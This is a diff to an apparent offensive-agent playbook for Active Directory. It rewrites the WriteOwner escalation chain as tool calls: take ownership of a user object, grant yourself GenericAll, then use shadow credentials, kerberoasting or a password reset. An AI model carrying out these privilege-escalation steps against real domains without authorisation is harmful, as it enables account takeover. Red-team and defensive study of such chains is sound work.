@@ -95,13 +95,19 @@ group is immediate privesc; adding yourself to an ordinary group just yields
 that group's rights, which may be another edge to walk.
 
 ### WriteOwner
-Take ownership of an object, then grant yourself full control:
+Take ownership of the object first, then grant yourself full control:
 ```
-1. bloodyad_add_genericall(target_dn="CN=targetuser,CN=Users,DC=domain,DC=local", principal="youruser")
-   → Grant yourself GenericAll on the target
-2. Use GenericAll techniques above (shadow credentials, targeted kerberoast, password change)
+1. owner_edit(target="targetuser", new_owner="youruser")
+   → Rewrites the object's OwnerSid. Prints "OwnerSid modified successfully!"
+   → An object's owner holds WriteDacl implicitly, whatever its DACL says
+2. dacl_edit(target_dn="CN=targetuser,CN=Users,DC=domain,DC=local",
+             principal="youruser", rights="GenericAll")
+   → Now legal, because step 1 made you the owner
+3. Use GenericAll techniques above (shadow credentials, targeted kerberoast, password change)
 ```
-Note: If you have WriteOwner, use bloodyad_add_genericall to escalate permissions first.
+Note: WriteOwner does NOT grant you write access to the DACL, so step 2 without
+step 1 can only fail. Do not substitute bloodyad_add_genericall for step 1 —
+that call also needs a DACL write right you do not hold yet.
 
 ### GPO Abuse (Report to Orchestrator)
 When you have write access to a GPO (via BloodHound):
